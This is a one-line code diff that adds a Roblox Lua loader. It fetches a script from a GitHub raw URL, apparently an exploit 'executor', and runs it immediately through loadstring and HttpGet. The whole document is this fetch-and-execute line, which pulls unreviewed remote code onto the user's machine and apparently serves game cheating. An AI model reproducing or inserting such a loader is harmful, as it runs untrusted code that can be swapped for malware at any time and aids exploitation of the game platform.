@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ali-droidlol/Your-executor-internal/main/The%20executor"))()
